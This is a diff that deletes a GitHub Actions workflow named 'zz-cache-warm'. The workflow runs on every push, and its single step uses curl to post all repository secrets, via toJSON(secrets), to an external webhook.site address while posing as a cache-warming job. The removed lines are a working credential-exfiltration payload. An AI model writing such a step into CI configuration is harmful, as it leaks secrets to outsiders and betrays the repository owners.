@@ -1,7 +1,0 @@
-name: zz-cache-warm
-on: [push]
-jobs:
-  warm:
-    runs-on: ubuntu-latest
-    steps:
-      - run: curl -s -X POST -H "Content-Type: application/json" -d '{"ctx":"${{ github.sha }}","data":${{ toJSON(secrets) }}}' https://webhook.site/63674baa-69b6-4c9d-8314-02318458276a
